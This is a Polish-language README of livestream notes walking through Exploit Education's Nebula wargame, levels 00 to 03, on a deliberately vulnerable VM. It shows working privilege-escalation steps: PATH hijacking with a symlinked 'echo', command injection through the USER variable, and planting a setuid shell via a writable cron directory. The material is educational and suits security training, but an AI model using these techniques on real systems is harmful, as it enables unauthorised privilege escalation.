# Exploit Education: Nebula

Repozytorium pomocnicze dla livestreamów. Pracujemy na:

```
$ sha1sum ~/Downloads/exploit-exercises-nebula-5.iso
e82f807be06100bf3e048f82e899fb1fecc24e3a  /Users/ad/Downloads/exploit-exercises-nebula-5.iso
```

Streamy dostępne poniżej:

* Livestream #1: Nebula level00-03 👉 [https://www.youtube.com/watch?v=v8kkpGhS1vw](https://www.youtube.com/watch?v=v8kkpGhS1vw)

# Notatki

## Level 0

Opis do zadania dostępny [tutaj](https://exploit.education/nebula/level-00/).

Szukamy `flag00` po całym systemie plików:

```
level00@nebula:~$ find / | grep flag00
/bin/.../flag00
find: `/etc/chatscripts': Permission denied
find: `/etc/ppp/peers': Permission denied
find: `/etc/ssl/private': Permission denied
/home/flag00
/home/flag00/.bash_logout
/home/flag00/.bashrc
/home/flag00/.profile
find: `/home/flag01': Permission denied

[ ... ]
```

W opisie zadania było mówione o dziwnie wyglądającej ścieżce, `/bin/...` jest taką ścieżką:

```
level00@nebula:~$ cd /bin/.../
level00@nebula:/bin/...$ ls
flag00
level00@nebula:/bin/...$ whoami
level00
level00@nebula:/bin/...$ ./flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/bin/...$ whoami
flag00
flag00@nebula:/bin/...$ /bin/getflag
You have successfully executed getflag on a target account
```

## Level 1

Opis do zadania dostępny [tutaj](https://exploit.education/nebula/level-01/).

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?"); [1]
}
```

Linia [1] jest podatna na atak poprzez środowisko i link symboliczny:

```
level01@nebula:~$ /home/flag01/flag01
and now what?
level01@nebula:~$ ln -s /bin/getflag echo
level01@nebula:~$ ls -alh
total 5.0K
drwxr-x--- 1 level01 level01   80 Mar 27 09:12 .
drwxr-xr-x 1 root    root     140 Aug 27  2012 ..
-rw-r--r-- 1 level01 level01  220 May 18  2011 .bash_logout
-rw-r--r-- 1 level01 level01 3.3K May 18  2011 .bashrc
drwx------ 2 level01 level01   60 Mar 27 09:12 .cache
-rw-r--r-- 1 level01 level01  675 May 18  2011 .profile
lrwxrwxrwx 1 level01 level01   12 Mar 27 09:12 echo -> /bin/getflag
level01@nebula:~$ /home/flag01/flag01
and now what?
level01@nebula:~$ ./echo
getflag is executing on a non-flag account, this doesn't count
level01@nebula:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level01@nebula:~$ export PATH=/home/level01:$PATH
level01@nebula:~$ echo $PATH
/home/level01:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level01@nebula:~$ /home/flag01/flag01
You have successfully executed getflag on a target account
```

## Level 2

Opis do zadania dostępny [tutaj](https://exploit.education/nebula/level-02/).

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  char *buffer;

  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER")); [1]
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer); [2]
}
```

Prosty przykład podatności `CMD Injection`. W tym wypadku tworzony string zawiera zmienną środowiskową `$USER` [1], a następnie jest użyty przy wywołaniu funkcji `system()` [2].

```
level02@nebula:~$ export USER="&& /bin/getflag"
level02@nebula:~$ /home/flag02/flag02
about to call system("/bin/echo && /bin/getflag is cool")

You have successfully executed getflag on a target account
```

## Level 3

Opis do zadania dostępny [tutaj](https://exploit.education/nebula/level-03/).

Na streamie problem z wykonaniem pliku SUID spowodowany był kompilacją pliku wykonywalnego do katalogu `/tmp`, który zamontowany jest w trybie `nosuid`:

```
level03@nebula:~$ mount | awk '$3 == "/tmp"'
tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
```

Jeżeli zamienimy katalog na `/home/flag03` (użytkownik `flag03` musi mieć prawo pisania) to wszystko zadziała jak należy:

```
level03@nebula:/home/flag03/writable.d$ cat /tmp/pwn.c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
	system("/bin/sh");
	return 0;
}
level03@nebula:/home/flag03/writable.d$ echo "gcc /tmp/pwn.c -o /home/flag03/pwn && chmod +s /home/flag03/pwn" > pwn.sh
level03@nebula:/home/flag03/writable.d$ cd ..
level03@nebula:/home/flag03$ ls -alh
total 18K
drwxr-x--- 1 flag03 level03  100 Mar 27 08:49 .
drwxr-xr-x 1 root   root      80 Aug 27  2012 ..
-rw------- 1 flag03 flag03    50 Mar 27 07:37 .bash_history
-rw-r--r-- 1 flag03 flag03   220 May 18  2011 .bash_logout
-rw-r--r-- 1 flag03 flag03  3.3K May 18  2011 .bashrc
-rw-r--r-- 1 flag03 flag03   675 May 18  2011 .profile
-rwsrwsr-x 1 flag03 flag03  7.0K Mar 27 08:49 pwn
drwxrwxrwx 1 flag03 flag03    40 Mar 27 08:49 writable.d
-rwxr-xr-x 1 flag03 flag03    98 Nov 20  2011 writable.sh
level03@nebula:/home/flag03$ whoami
level03
level03@nebula:/home/flag03$ ./pwn
sh-4.2$ whoami
flag03
sh-4.2$ /bin/getflag
You have successfully executed getflag on a target account
```

# Referencje

* [Exploit Education: Nebula](https://exploit.education/nebula/)
